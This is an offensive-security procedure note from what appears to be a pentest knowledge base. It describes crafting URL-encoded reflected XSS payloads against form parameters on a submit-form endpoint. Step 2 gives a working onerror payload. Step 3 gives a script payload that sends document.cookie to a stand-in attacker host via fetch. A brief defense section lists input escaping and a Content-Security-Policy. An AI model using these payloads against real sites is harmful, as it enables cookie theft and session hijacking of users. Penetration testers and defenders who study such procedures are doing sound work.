---
id: proc-uuid-2
tags:
  - xss
  - payload
  - javascript
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:21.023Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-XSS-Payloads-for-Form-Parameters

## Summary

This procedure crafts URL-encoded XSS payloads targeting unsanitized form parameters to break out of HTML contexts and execute JavaScript, commonly used in reflected XSS attacks chained with CSRF.

## Description

Targeting parameters like building, classroom, and course in a POST /submit-form endpoint, this involves encoding payloads to escape attributes (e.g., value="input") and inject <script> or event handlers. In the DoD application scenario, payloads exploit insufficient escaping, leading to execution upon form processing. Prerequisites: Identified vulnerable endpoint and proxy tool. Outcomes include arbitrary JS execution for cookie theft.

## Requirements

1. Knowledge of HTML/JS contexts and encoding (URL, HTML entities)
2. Burp Suite for request manipulation
3. Target endpoint confirmed vulnerable to injection

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all user inputs with HTML entity encoding
- Implement Content-Security-Policy to block inline scripts
- Validate input lengths and patterns server-side

## Objectives

1. Escape HTML attribute boundaries
2. Trigger JavaScript execution in victim context
3. Enable data exfiltration or manipulation

## Instructions

### Step 1: Analyze Parameter Context

**Context**: Determine how parameters are reflected in the response (e.g., in HTML attributes).

Intercept a legitimate POST in [[tools/Burp-Suite]] and submit to see reflection, e.g., <input value="[building]">.

**Expected Output**: Identification of breakout point, like closing the quote and tag.

### Step 2: Encode and Test Basic Payload

**Context**: Inject a simple onerror payload to confirm execution.

In Burp Repeater, set building=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E and POST. URL-decode mentally: "><img src=x onerror=alert(document.domain)>

**Expected Output**: Alert with domain name on response load.

### Step 3: Refine for Evasion and Chaining

**Context**: Adapt payload for stealth, e.g., exfiltrate cookies via fetch.

Modify to %22%3E%3Cscript%3Efetch('https://attacker.com?cookie='+document.cookie)%3C/script%3E and test across classroom/course.

**Expected Output**: Data sent to attacker server.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[xss]]
- [[payload]]
- [[JavaScript]]
